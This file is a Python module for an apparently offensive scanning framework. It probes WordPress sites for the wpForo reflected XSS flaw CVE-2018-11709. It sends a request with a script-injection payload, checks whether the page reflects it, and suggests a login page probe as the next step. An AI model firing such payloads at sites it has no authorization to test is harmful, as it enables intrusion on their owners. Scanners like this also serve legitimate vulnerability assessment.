#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress wpForo Forum plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress wpForo Forum <= 1.4.11 - Cross-Site Scripting Detection',
        'description': 'WordPress wpForo Forum plugin before 1.4.12 for WordPress allows unauthenticated reflected cross-site scripting via the URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wordpress', 'xss', 'wp-plugin', 'gvectors', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-11709',
            'https://wordpress.org/plugins/wpforo/#developers',
            'https://wpvulndb.com/vulnerabilities/9090',
            'https://blog.dewhurstsecurity.com/2018/06/01/wp-foro-wordpress-plugin-xss-vulnerability.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-11709',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php/community/?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_any = ('</script><script>alert(document.domain)</script>', 'wpforo',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress wpForo Forum <= 1.4.11 - Cross-Site Scripting detected",
                path='/index.php/community/?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

